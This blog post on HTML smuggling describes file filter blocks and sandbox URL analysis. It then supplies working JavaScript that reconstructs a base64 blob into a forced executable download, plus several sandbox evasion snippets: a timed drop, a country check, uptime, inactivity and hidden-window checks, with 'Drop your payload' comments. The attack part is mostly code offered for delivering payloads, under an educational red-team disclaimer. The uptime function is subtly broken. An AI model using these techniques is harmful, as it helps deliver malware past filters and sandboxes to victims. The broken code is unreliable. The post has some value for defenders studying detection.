---
layout: post
title: "Make HTML Smuggling Great Again P1"
date: 2024-12-30
categories: security html
---

# Make HTML Smuggling Great Again P1 

## Introduction

Letʼs start with Mitreʼs definition for HTML Smuggling:

> “Adversaries may smuggle data and files past content filters by hiding 
malicious payloads inside of seemingly benign HTML files. HTML documents 
can store large binary objects known as JavaScript Blobs (immutable data that 
represents raw bytes) that can later be constructed into file-like objects. Data 
may also be stored in Data URLs, which enable embedding media type or MIME 
files inline of HTML documents. HTML5 also introduced a download attribute 
that may be used to initiate file downloads.”

The adversary will use this technique to bypass certain security controls, 
such as firewalls/proxies for 'file filter blocks' and sandboxes. Letʼs dive a little 
bit into File Filter Blocks mechanism.

---

## File Filter Blocks

A file filter block is a control mechanism designed to prevent users from 
downloading or accessing specific types of files based on their file extensions.

### How File Filter Blocks Work

**Inspection**  
The system inspects file requests made by users (e.g., HTTP/HTTPS 
traffic). It identifies files by their extensions.

**Matching**  
The system compares the file's attributes (e.g., .exe, .mp3, .pdf) 
against a pre-configured blocklist.

**Action**  
If the file matches a block rule, the system denies access, cancels the 
download, and logs the attempt for review.

---

## Example: Bypassing File Filter Blocks with Blobs

Let's take Putty as an example. If we try to download it from a URL, and the
URL ends with
.exe , the FFB will block the request and prevent you from downloading it.

![image](https://github.com/user-attachments/assets/61905d8a-50bf-4b70-82e2-7cbc39a45a64)


Here’s a sample script to bypass file filter blocks using JavaScript:

```html
<script>
    function downloadFromBase64() {
        const base64String = "BASE64_STRING_HERE";
        const fileName = "putty.exe";
        const byteCharacters = atob(base64String);
        const byteNumbers = new Array(byteCharacters.length)
            .fill(0)
            .map((_, i) => byteCharacters.charCodeAt(i));
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray]);
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();
        URL.revokeObjectURL(link.href);
    }
</script>
```

![image](https://github.com/user-attachments/assets/b5b44c26-7a08-4f76-b666-a7b273da290c)

As you can see, we managed to bypass FFB as well. However, there’s always a
"but." If you’ve reached this point, it means you have successfully bypassed
Sandbox checks. Let’s step back and discuss how we can bypass it using some
techniques.

---

## Sandbox for Analysis of URLs

A sandbox is an isolated environment used to analyze URLs, files, or other
digital artifacts safely without risking the security of the host system. It's used
to detect malicious activity, evaluate potential threats, or test unknown software
in a controlled manner.
When applied to URL analysis, a sandbox performs two types of examination:


### Static Analysis
Static analysis involves evaluating the URL's components and associated
metadata to identify malicious intent without executing any code or visiting the
site. 
Key elements include:

- **URL Structure and Format:** Checks for anomalies such as excessively long URLs, obfuscated strings, or suspicious subdomains.
- **Domain Reputation:** Queries against databases to determine if the domain or IP is flagged as malicious.
- **Embedded Indicators:** Looks for encoded malicious scripts or patterns in the URL itself.
- **Certificate Validity:** Verifies if the SSL certificate is valid, expired, or suspicious.

Static analysis tools are fast and lightweight but may miss sophisticated threats
that activate only upon execution.

### Dynamic Analysis
Dynamic analysis involves actively engaging with the URL in a sandbox
environment. It simulates real-world user interactions to observe its behavior.
This approach captures more complex and concealed threats, such as those
hidden in scripts, redirections, or embedded files.
Key steps in dynamic analysis include:

- **Launching the URL**  
   The sandbox opens the link in a controlled, isolated browser instance.
- **Monitoring Behavior**  
   Observes for suspicious activities, such as:  
   - Downloads of malicious files.  
   - Unusual network connections.  
   - Script execution patterns, including obfuscation or injection attacks.
- **Recording Interactions**  
   Logs the URL's behavior for further investigation.
- **System Changes**  
   Checks if the sandbox system experiences unauthorized modifications or file drops.

Dynamic analysis is effective but resource-intensive compared to static
analysis.
So, the sandbox will do the best to stop you from deliver you payload, but today
will do our best to bypass it.


---

## Sandbox Evasion Techniques

### Play for Time
Most sandboxes take about five minutes to analyze a sample and determine
whether it is malicious or not. So, from the moment you send the email, count
five minutes, and then drop your payload.
Let’s say you will send the email on 09:00AM, so you need to drop you payload
on 09:05AM. We can do that with JS

```javascript
function isTimeNow905AM() {
    const now = new Date();
    const hours = now.getHours();
    const minutes = now.getMinutes();
    if (hours === 9 && minutes === 5) {
        console.log("The current time is 09:05 AM.");
        return true;
    } else {
        console.log("The current time is not 09:05 AM.");
        return false;
    }
}
```

### Detect Country Code
If your target is in country XYZ, limit the scope to just this country. Block or
redirect any requests coming from outside this country to something else. This
will help keep external sandboxes away from your infrastructure.

```javascript
function detectCountry() {
    return fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            if (data.country === 'US') {
                console.log("User is in US.");
                return true;
            }
            console.log("User is not in US.");
            return false;
        })
        .catch(() => console.error("Error fetching user's country."));
}
```

### Detect High System Uptime
Sandboxes are often freshly booted, so system uptime is very low. Check for
uptime less than a threshold.

```javascript
function isSystemUptimeLessThan5Minutes() {
    if ('performance' in window && 'timeOrigin' in performance) {
        const uptimeMilliseconds = performance.now();
        const totalUptimeMinutes = (uptimeMilliseconds + performance.timeOrigin) / 60000;
        if (totalUptimeMinutes < 5) {
            console.log("System uptime is less than 5 minutes.");
            return true;
        }
        console.log("System uptime is greater than or equal to 5 minutes.");
        return false;
    }
    console.error("System uptime cannot be detected in this browser.");
    return false;
}
```

# Detect Inactivity or Limited User Interaction

Before performing any action, check if there is any real user interaction. Sandboxes often run without real user interaction, such as:

- No mouse movement
- No clicks
- No keystrokes

This simple trick can help bypass some sandboxes.

```javascript
function detectLimitedInteraction(timeout = 30000) { // Timeout in milliseconds (default: 30 seconds)
    let lastInteractionTime = Date.now();

    // Update the last interaction time on any user activity
    function resetInteractionTimer() {
        lastInteractionTime = Date.now();
        console.log("User interaction detected."); // Drop your payload
    }

    // Add event listeners for common user interactions
    window.addEventListener('mousemove', resetInteractionTimer);
    window.addEventListener('keydown', resetInteractionTimer);
    window.addEventListener('click', resetInteractionTimer);
    window.addEventListener('scroll', resetInteractionTimer);

    // Periodically check for inactivity
    setInterval(() => {
        const timeSinceLastInteraction = Date.now() - lastInteractionTime;
        if (timeSinceLastInteraction > timeout) {
            console.log("No user interaction detected for over 30 seconds.");
        }
    }, 1000); // Check every second
}

// Start monitoring for limited user interaction
detectLimitedInteraction();
```

# Detect Hidden Browser Windows

Sandboxes sometimes hide or minimize the browser window. To detect such environments, check for unusual dimensions or window states.

```javascript
function detectHiddenWindow() {
    function checkWindowState() {
        const isMinimized = window.outerWidth <= 100 || window.outerHeight <= 100;
        const isHidden = document.visibilityState === 'hidden';

        if (isMinimized || isHidden) {
            console.log("The browser window is hidden or minimized.");
        } else {
            console.log("The browser window is visible and active."); // Drop your payload
        }
    }

    // Listen for visibility change events
    document.addEventListener('visibilitychange', checkWindowState);

    // Listen for window resize events
    window.addEventListener('resize', checkWindowState);

    // Initial check
    checkWindowState();
}

// Start monitoring the window state
detectHiddenWindow();
```
By applying these techniques, you can successfully bypass certain sandboxes.
More advanced techniques will be covered in the next part.


---

## Closing

As demonstrated, HTML Smuggling is a powerful technique that adversaries
can use to bypass traditional security controls such as file filter blocks and
sandboxing mechanisms. By leveraging JavaScript Blobs, Base64 encoding,
and strategic evasion methods, attackers can deliver malicious payloads
effectively while avoiding detection.
However, understanding the mechanisms behind these security measures
provides critical insight into their strengths and limitations. By dissecting file
filter block functionality and examining how sandboxes analyze URLs and
behaviors, we can appreciate the sophistication of modern security systems
while recognizing the ways attackers exploit.

**Disclaimer:**  
The content here is provided strictly for educational and authorized red teaming purposes. Unauthorized use may result in severe legal consequences.
